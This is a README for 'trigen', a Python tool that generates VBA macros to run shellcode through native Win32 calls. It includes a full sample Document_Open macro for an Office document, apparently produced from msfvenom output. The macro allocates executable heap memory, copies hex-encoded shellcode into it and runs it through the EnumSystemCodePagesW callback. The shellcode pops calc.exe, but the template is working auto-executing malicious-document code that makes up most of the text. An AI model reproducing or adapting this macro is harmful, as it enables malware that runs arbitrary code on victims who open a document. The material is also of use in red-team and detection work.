# trigen
Trigen is a Python script which uses different combinations of Win32 function calls in generated VBA to execute shellcode.

Blog post - [17JAN2017 - Abusing native Windows functions for shellcode execution](http://ropgadget.com/posts/abusing_win_functions.html)

Below is an example output using msfvenom to generate shellcode for input.

```
# python trigen.py "$(msfvenom --payload windows/exec CMD='calc.exe' -f c)"
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 193 bytes

################################################
#                                              #
#   Copy VBA to Microsoft Office 97-2003 DOC   #
#                                              #
#   Alloc: HeapAlloc                           #
#   Write: RtlMoveMemory                       #
#   ExeSC: EnumSystemCodePagesW                #
#                                              #
################################################

Private Declare Function createMemory Lib "kernel32" Alias "HeapCreate" (ByVal flOptions As Long, ByVal dwInitialSize As Long, ByVal dwMaximumSize As Long) As Long
Private Declare Function allocateMemory Lib "kernel32" Alias "HeapAlloc" (ByVal hHeap As Long, ByVal dwFlags As Long, ByVal dwBytes As Long) As Long
Private Declare Sub copyMemory Lib "ntdll" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long

Private Sub Document_Open()

Dim shellCode As String
Dim shellLength As Byte
Dim byteArray() As Byte
Dim memoryAddress As Long
Dim zL As Long
zL = 0
Dim rL As Long

shellCode = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"

shellLength = Len(shellCode) / 2
ReDim byteArray(0 To shellLength)

For i = 0 To shellLength - 1

    If i = 0 Then
        pos = i + 1
    Else
        pos = i * 2 + 1
    End If
    Value = Mid(shellCode, pos, 2)
    byteArray(i) = Val("&H" & Value)

Next

rL = createMemory(&H40000, zL, zL)
memoryAddress = allocateMemory(rL, zL, &H5000)

copyMemory ByVal memoryAddress, byteArray(0), UBound(byteArray) + 1

executeResult = shellExecute(memoryAddress, zL)

End Sub```
